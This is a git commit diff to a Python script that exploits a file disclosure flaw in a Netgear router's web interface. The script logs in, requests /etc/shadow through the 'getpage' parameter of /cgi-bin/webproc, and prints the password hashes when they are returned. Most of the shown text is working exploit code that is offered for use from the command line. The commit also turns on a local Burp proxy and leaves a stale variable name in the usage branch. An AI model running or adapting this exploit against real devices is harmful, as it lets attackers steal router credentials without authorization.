4ac2f74ff4fdcd3f0acc31177009e6638a83568e
hyoin Moon <mhi84150@gmail.com>
2019-11-13 16:07:35 +0900

    Update Netgear_Path_Traversal.py

--- Netgear_Path_Traversal.py
+++ Netgear_Path_Traversal.py
@@ -4,7 +4,7 @@ import sys
 import base64
 from colorama import Fore
 
-decription= r"""
+description= r"""
  -----------------------------------------------------------------------------
 |                                                                            |
 |                                                                            |
@@ -24,40 +24,38 @@ def exploit(target, ID, password):
 	encookie = base64.encodestring(base)
 
 	#to use burpsuite
-	#proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}
+	proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}
 
 	s = requests.Session()
 
 	#get sessionid
 	URL = 'http://'+target+'/cgi-bin/webproc'
 	headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
-	res = s.get(URL, headers=headers)
+	res = s.get(URL, headers=headers, proxies=proxies)
 
 	#set sessionid & login
 	dic = s.cookies.get_dict()
 	cookies = {'Cookie' : 'sessionid=' + dic.get('sessionid')}
-	res = s.get(URL, headers=headers, cookies=cookies)
+	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
 
 	#Remote File Disclosure
 	URL = 'http://' + target + '/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home'
-	res = s.get(URL, headers=headers, cookies=cookies)
+	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
 
 	check = res.text[6:11]
 
 	if check == '$1$BO':
-		print ('This device has this vulnerability\n')
 		print(res.text.rstrip('\n'))
+		print (Fore.GREEN+" [+] This device has this vulnerability"+Fore.RESET)
 	else:
-		print('This device does not have this vulnerability')
+		print (Fore.YELLOW+" [-] This device does not have this vulnerability"+Fore.RESET)
 	
 
 if __name__ == "__main__":
-	print decription
+	print description
 	if len(sys.argv) is not 4:
 		print(decription)
 		print(Fore.RED+"[-] Example: python Netgear_Path_Traversal.py <Target IP> <ID> <Password>"+Fore.RESET)
 		sys.exit()
 	else:
 		exploit(sys.argv[1], sys.argv[2], sys.argv[3])
-
-
